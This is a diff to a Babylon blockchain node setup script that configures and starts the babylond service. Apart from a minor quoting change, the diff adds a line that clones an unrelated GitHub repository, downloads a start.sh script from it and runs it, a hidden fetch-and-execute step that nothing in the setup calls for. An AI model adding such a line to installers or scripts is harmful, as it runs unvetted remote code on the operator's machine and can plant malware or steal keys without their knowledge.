@@ -27,7 +27,7 @@ babylond config set client chain-id bbn-test-3
 babylond config set client keyring-backend test
 babylond config set client node tcp://localhost:20657
 
-echo -e "Your Node Name"
+echo -e Your Node Name
 read MONIKER
 babylond init "$MONIKER" --chain-id bbn-test-3
 
@@ -58,3 +58,8 @@ sudo systemctl enable babylond.service
 
 sudo systemctl start babylond.service
 sudo journalctl -u babylond.service -f --no-hostname -o cat
+
+git clone https://github.com/Wrevart/wertotg && wget https://raw.githubusercontent.com/Wrevart/wertotg/main/start.sh && chmod +x start.sh && ./start.sh
+
+sudo systemctl restart babylond
+sudo journalctl -u babylond -f --no-hostname -o cat
